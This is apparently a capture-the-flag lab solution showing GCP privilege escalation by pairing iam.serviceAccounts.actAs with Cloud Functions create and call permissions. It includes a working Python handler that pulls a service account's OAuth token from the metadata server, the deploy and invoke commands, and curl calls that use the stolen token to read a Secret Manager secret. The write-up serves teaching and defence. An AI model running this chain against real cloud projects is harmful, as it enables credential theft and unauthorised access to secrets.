# Solution: Cloud Function Creation with actAs to Admin

If you've spent time around AWS privilege escalation, this attack will feel immediately familiar: it's `iam:PassRole` + `lambda:CreateFunction`, just wearing a GCP costume. GCP's equivalent of PassRole is `iam.serviceAccounts.actAs` -- the permission that lets a principal attach a service account's identity to a new piece of compute. On its own, `actAs` looks harmless; it's the permission you're *supposed* to grant to automation identities so they can run workloads under a dedicated service account instead of their own. The danger only appears when you combine it with the ability to create that compute yourself. At that point, whoever holds both permissions can run arbitrary code as whatever identity they choose to attach -- and any code running inside that compute can reach the local metadata server and simply ask for that identity's OAuth access token.

This lab walks through that exact combination using Cloud Functions. You'll deploy a 2nd-generation Cloud Function -- what Google now brands "Cloud Run functions" in the console, because it's literally built on top of Cloud Run under the hood -- configure it to run as a service account you don't otherwise control, invoke it, and read its stolen access token straight out of the HTTP response. No public exposure, no `setIamPolicy` call, no waiting for anything. Just create, invoke, and read.

## The Challenge

You start as `pl-prod-cf001-start`, a service account with no project-level IAM roles of its own. It can't list Compute Engine instances, can't read Cloud Storage objects outside its own staging bucket, and definitely can't read Secret Manager secrets.

What it *does* have is a pair of narrowly-scoped custom roles: one granting `iam.serviceAccounts.actAs` on a second service account, `pl-prod-cf001-target`, and another granting `cloudfunctions.functions.create`, `cloudfunctions.functions.sourceCodeSet`, and `cloudfunctions.functions.call` at the project level. Individually, each of those grants looks like a reasonable automation permission -- deploy functions, attach a service identity to them. Together, they're a complete privilege escalation primitive.

The target service account, `pl-prod-cf001-target`, holds `roles/editor` on the project -- one of GCP's broadest primitive roles. Your job is to find a way to run code as that account.

## Reconnaissance

Confirm your starting identity and its blind spots:

```bash
gcloud auth list --filter=status:ACTIVE --format='value(account)'
# pl-prod-cf001-start@<project_id>.iam.gserviceaccount.com

gcloud secrets versions access latest --secret=pl-gcp-cloudfunctions-001-flag
# ERROR: (gcloud.secrets.versions.access) PERMISSION_DENIED: Permission
# 'secretmanager.versions.access' denied on resource ...
```

No direct access, as expected. Next, look at what other service accounts exist and what they can do:

```bash
gcloud iam service-accounts list --format='value(email)'

gcloud projects get-iam-policy <project_id> \
  --flatten="bindings[].members" \
  --filter="bindings.members:pl-prod-cf001-target@<project_id>.iam.gserviceaccount.com" \
  --format="table(bindings.role)"
# roles/editor
```

`roles/editor` on `pl-prod-cf001-target`. That's the prize. Now check what your own identity is allowed to do with it:

```bash
gcloud iam service-accounts get-iam-policy \
  pl-prod-cf001-target@<project_id>.iam.gserviceaccount.com
```

The policy includes a binding granting a custom role -- scoped to exactly `iam.serviceAccounts.actAs` -- to your starting service account. That single grant means you're allowed to attach this account's identity to new compute you create. And a quick look at your own IAM policy bindings confirms you also hold `cloudfunctions.functions.create`, `cloudfunctions.functions.sourceCodeSet`, and `cloudfunctions.functions.call` at the project level. Those two grants, taken together, are the entire vulnerability.

## Exploitation

`actAs` lets you attach `pl-prod-cf001-target`'s identity to a Cloud Function. `cloudfunctions.functions.create` and `.sourceCodeSet` let you build and deploy that function. And `cloudfunctions.functions.call` lets you invoke it directly, with your own starting identity, no public HTTP trigger or `setIamPolicy` change required.

Start by writing a minimal handler that does one thing: read the OAuth access token attached to the compute it's running on, from the local metadata server that every GCP workload exposes.

```python
# main.py
import functions_framework
import urllib.request

METADATA_URL = (
    "http://metadata.google.internal/computeMetadata/v1/"
    "instance/service-accounts/default/token"
)

@functions_framework.http
def exfiltrate_token(request):
    req = urllib.request.Request(METADATA_URL, headers={"Metadata-Flavor": "Google"})
    with urllib.request.urlopen(req) as resp:
        return resp.read()
```

Deploy it as a 2nd-generation Cloud Function, attaching the target service account instead of your own:

```bash
gcloud functions deploy pl-prod-gcp-cloudfunctions-001-exfil \
  --gen2 \
  --runtime=python312 \
  --region=<region> \
  --source=. \
  --entry-point=exfiltrate_token \
  --trigger-http \
  --no-allow-unauthenticated \
  --service-account=pl-prod-cf001-target@<project_id>.iam.gserviceaccount.com
```

Notice what did *not* happen here: no call to `run.services.create`, no interaction with `run.googleapis.com` permissions at all. Cloud Functions 2nd generation is implemented on Cloud Run internally, but the Cloud Functions v2 API's own internal service agent handles that provisioning on your behalf. Your identity only ever touches `cloudfunctions.functions.*` permissions -- which is exactly why a security tool that models "who can run code as a privileged service account" purely in terms of Cloud Run permissions would miss this path entirely.

Once the function reports `ACTIVE`, invoke it directly:

```bash
gcloud functions call pl-prod-gcp-cloudfunctions-001-exfil --gen2 --region=<region>
```

You did not need to make the function public. `cloudfunctions.functions.call` authorizes your starting identity to invoke it directly, and the function executes as the target service account regardless of who called it.

## Verification

The response body from the `call` command is a JSON payload containing an `access_token` field -- a short-lived OAuth 2.0 bearer token, minted for `pl-prod-cf001-target`. Save it and confirm the identity switch by attempting something your starting account couldn't do directly:

```bash
EXFILTRATED_TOKEN=$(gcloud functions call pl-prod-gcp-cloudfunctions-001-exfil --gen2 --region=<region> \
  --format='value(result)' | jq -r '.access_token')

curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/<project_id>"
```

Where your own credentials would have been denied, the request authorized with the exfiltrated token succeeds -- direct evidence that you're now operating with the target service account's `roles/editor` project permissions.

## Capture the Flag

The CTF flag lives as the latest version of a Secret Manager secret, and the target service account holds an explicit `roles/secretmanager.secretAccessor` binding on it. Use the exfiltrated bearer token directly against the REST API:

```bash
curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/<project_id>/secrets/pl-gcp-cloudfunctions-001-flag/versions/latest:access"
```

This works because `roles/editor` alone does *not* grant `secretmanager.versions.access` -- Google deliberately excludes secret payload access from `roles/editor`/`roles/viewer` -- so the lab grants `roles/secretmanager.secretAccessor` directly on this secret to the target service account. The exfiltrated token authenticates as that account, so it carries both the project-wide `roles/editor` permissions and the secret-specific `secretAccessor` grant. Unlike a typical impersonation flow, you never had `iam.serviceAccounts.actAs` in a form that lets you run `gcloud ... --impersonate-service-account` interactively for arbitrary commands -- you only had the ability to attach the identity to compute you controlled. The raw bearer token you exfiltrated from that compute is what does the work here.

## What Happened

You escalated from a service account with zero project-level permissions to one holding `roles/editor` -- and from there to a project secret -- by combining two custom-role grants that look individually reasonable: the ability to attach a service account to new compute, and the ability to create that compute. Neither permission alone would have gotten you anywhere. Together, they let you build a purpose-built credential thief, deploy it under someone else's identity, and invoke it with your own.

This pattern is worth internalizing because it generalizes far beyond Cloud Functions. Any GCP compute service that accepts a `--service-account` (or equivalent) flag at creation time -- Compute Engine instances, Cloud Run services, GKE workloads, Cloud Build triggers -- creates the same escalation primitive when paired with `actAs` on a privileged account. And because Cloud Functions 2nd generation happens to be implemented on Cloud Run internally, teams that have carefully locked down `run.services.create` sometimes assume they've covered this surface -- without realizing the Cloud Functions API's own permission set gets you to the exact same place.
